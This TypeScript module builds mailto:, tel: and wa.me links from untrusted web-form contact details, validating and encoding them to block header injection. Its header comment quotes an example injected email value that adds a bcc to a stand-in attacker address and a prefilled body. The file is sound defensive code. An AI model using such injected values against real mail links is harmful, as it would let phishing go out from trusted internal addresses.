/**
 * Builds `mailto:` and `tel:` targets from contact details that came in off a public form.
 *
 * A lead's email is never validated for shape — the only rule is that a lead has *some* contact
 * method — so whatever a stranger typed into a booking widget ends up here verbatim. Dropped
 * straight into `location.href`, `jan@example.com?bcc=exfil@evil.com&body=…` opens the team
 * member's own mail client with the attacker's recipients and text already filled in. One
 * distracted Send and a phishing mail has gone out from a trusted internal address.
 *
 * So: refuse anything that is not a plain address or number, and percent-encode what survives.
 */

/**
 * Deliberately stricter than the RFC. It has to reject the characters that turn an address into
 * extra headers — `?`, `&`, whitespace, newlines — and every real address a coaching or building
 * business will ever mail passes. An exotic-but-valid address is better refused than turned into
 * a mail somebody did not write.
 */
const PLAIN_EMAIL = /^[^\s@?&#/\\<>,;:"']+@[^\s@?&#/\\<>,;:"']+\.[a-z]{2,}$/i;

/** Digits, with the punctuation people actually write numbers with. No URL syntax. */
const PLAIN_PHONE = /^\+?[\d\s().-]{4,}$/;

/** The address if it is safe to hand to a mail client, otherwise null. */
export function safeEmail(email?: string | null): string | null {
	const trimmed = email?.trim();
	if (!trimmed || !PLAIN_EMAIL.test(trimmed)) return null;
	return trimmed;
}

/** The number if it is safe to hand to a dialler, otherwise null. */
export function safePhone(phone?: string | null): string | null {
	const trimmed = phone?.trim();
	if (!trimmed || !PLAIN_PHONE.test(trimmed)) return null;
	return trimmed;
}

/**
 * `mailto:` for an address, or null when it cannot be trusted.
 *
 * Encoded on the way out as well as validated: belt and braces, since the regex is the thing that
 * would have to be got past and encoding makes a miss inert rather than exploitable.
 */
export function mailtoUrl(email?: string | null): string | null {
	const safe = safeEmail(email);
	return safe ? `mailto:${encodeURIComponent(safe)}` : null;
}

/** `tel:` for a number, or null when it cannot be trusted. */
export function telUrl(phone?: string | null): string | null {
	const safe = safePhone(phone);
	return safe ? `tel:${encodeURIComponent(safe)}` : null;
}

/** Digits only, country code included, no leading `+` — what wa.me expects. */
export function whatsappUrl(phone?: string | null): string | null {
	const digits = safePhone(phone)?.replace(/\D/g, "");
	return digits && digits.length >= 6 ? `https://wa.me/${digits}` : null;
}
